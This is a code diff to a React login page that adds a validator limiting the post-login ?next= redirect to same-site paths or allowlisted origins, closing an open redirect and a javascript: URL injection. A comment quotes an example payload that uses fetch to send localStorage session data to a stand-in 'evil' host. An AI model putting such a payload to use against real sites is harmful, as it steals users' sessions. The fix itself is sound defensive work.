@@ -23,6 +23,30 @@ export default function LoginPage() {
     return new URLSearchParams(window.location.search).get('next') || '/';
   };
 
+  // ?next= is attacker-supplied and ends up in window.location.href, so it
+  // has to be one of exactly two shapes: a path on this site, or an absolute
+  // URL on a domain we listed. Anything else goes to the homepage.
+  //
+  // Without this, only the `http...` branch was checked, and everything else
+  // was assigned straight to window.location.href -- so
+  //   /login?next=javascript:fetch('https://evil/?t='+localStorage[...])
+  // ran that script in this origin, with the Supabase session in reach, the
+  // moment the person signed in. `//evil.tld` was the plain open-redirect
+  // form of the same hole (it doesn't start with "http" either).
+  const safeNext = (next) => {
+    if (typeof next !== 'string' || next === '') return '/';
+    // A site-relative path: one leading slash, and not "//host" or "/\host",
+    // both of which browsers resolve as protocol-relative to another origin.
+    if (next.startsWith('/') && !next.startsWith('//') && !next.startsWith('/\\')) return next;
+    try {
+      const url = new URL(next);
+      if ((url.protocol === 'https:' || url.protocol === 'http:') && ALLOWED_ORIGINS.includes(url.origin)) {
+        return url.toString();
+      }
+    } catch { /* not a URL at all */ }
+    return '/';
+  };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     setError('');
@@ -34,7 +58,7 @@ export default function LoginPage() {
       setError(error.message);
       return;
     }
-    const next = getNextParam();
+    const next = safeNext(getNextParam());
     if (next.startsWith('http')) {
       // Returning to a different domain (SunScout, AsliVastu) -- that
       // site can't see this domain's session cookie, so hand it the
@@ -54,6 +78,7 @@ export default function LoginPage() {
       url.hash = `access_token=${encodeURIComponent(data.session.access_token)}&refresh_token=${encodeURIComponent(data.session.refresh_token)}`;
       window.location.href = url.toString();
     } else {
+      // safeNext has already guaranteed this is a same-site path.
       window.location.href = next;
     }
   };
@@ -61,7 +86,7 @@ export default function LoginPage() {
   const handleGoogleSignIn = async () => {
     setError('');
     const supabase = createClient();
-    const next = encodeURIComponent(getNextParam());
+    const next = encodeURIComponent(safeNext(getNextParam()));
     const { error } = await supabase.auth.signInWithOAuth({
       provider: 'google',
       options: {
